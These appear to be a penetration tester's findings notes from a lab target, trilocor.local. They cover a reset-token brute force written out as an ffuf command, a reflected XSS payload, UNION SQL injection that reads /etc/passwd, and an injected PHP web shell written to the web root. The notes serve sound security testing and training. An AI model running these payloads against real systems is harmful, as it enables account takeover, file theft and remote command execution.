# www.trilocor.local:8080

---

Listing enabled for /assets

[http://www.trilocor.local:8080/assets/](http://www.trilocor.local:8080/assets/)

![image.png](www%20trilocor%20local%208080/image.png)

---

Admin disclosure

![image.png](www%20trilocor%20local%208080/image%201.png)

```bash
./username-anarchy Roy Batty > roy.txt
```

```bash
cat ../../cloned/username-anarchy/roy.txt

roy
roybatty
roy.batty
roybatt
royb
r.batty
rbatty
broy
b.roy
battyr
batty
batty.r
batty.roy
rb
```

![image.png](www%20trilocor%20local%208080/image%202.png)

---

CRITICAL: Token bruteforce

```bash
POST /reset.php HTTP/1.1
Host: www.trilocor.local:8080
Content-Length: 66
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.trilocor.local:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.trilocor.local:8080/reset.php?username=r.batty
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=4tttucctsmank9u3iqrmq4gsdp
Connection: close

username=r.batty&token=1111&password=user12345&pass_conf=user12345
```

```bash
seq -w 0 9999 > tokens.txt
```

```bash
ffuf -u "http://www.trilocor.local:8080/reset.php" -X POST -H "Origin: http://www.trilocor.local:8080" -H "Cookie: PHPSESSID=4tttucctsmank9u3iqrmq4gsdp" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36" -H "Referer: http://www.trilocor.local:8080/reset.php?username=r.batty" -H "Cache-Control: max-age=0" -H "Upgrade-Insecure-Requests: 1" -H "Accept-Language: en-US,en;q=0.9" -H "Content-Type: application/x-www-form-urlencoded" -d "username=r.batty&token=FUZZ&password=user12345&pass_conf=user12345" -w tokens.txt -ac
```

![image.png](www%20trilocor%20local%208080/image%203.png)

Trying r.batty:user12345

![image.png](www%20trilocor%20local%208080/image%204.png)

---

CRITICAL: Weak hashing

![image.png](www%20trilocor%20local%208080/image%205.png)

![image.png](www%20trilocor%20local%208080/image%206.png)

---

CRITICAL: SQL injection on /resumes.php

```bash
POST /resumes.php HTTP/1.1
Host: www.trilocor.local:8080
Content-Length: 12
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.trilocor.local:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.trilocor.local:8080/resumes.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=renqceq82tsc4ivms5s217aflu
Connection: close

search=user
```

![image.png](www%20trilocor%20local%208080/image%207.png)

MISCONFIG: User is DBA

![image.png](www%20trilocor%20local%208080/image%208.png)

---

Reflected XSS

```bash
http://www.trilocor.local:8080/reset.php?username=r.batty%22%3e%3cscript%3ealert(1)%3c%2fscript%3e
```

![image.png](www%20trilocor%20local%208080/image%209.png)

---

Resume search UNION SQLi

![image.png](www%20trilocor%20local%208080/image%2010.png)

![image.png](www%20trilocor%20local%208080/image%2011.png)

---

SQLi — file read

```bash
search=user' UNION SELECT 1,2,3,4,5,(SELECT LOAD_FILE('/etc/passwd')) --
```

![image.png](www%20trilocor%20local%208080/image%2012.png)

Source code disclosure

![image.png](www%20trilocor%20local%208080/image%2013.png)

File write

```bash
search=user' UNION SELECT 1,2,3,4,5,"<?php system($_GET['cmd']); ?>" into outfile "%2fvar%2fwww%2fpublic%2fshell%2ephp" -- -
```

![image.png](www%20trilocor%20local%208080/image%2014.png)

---

Long auth cookie validity time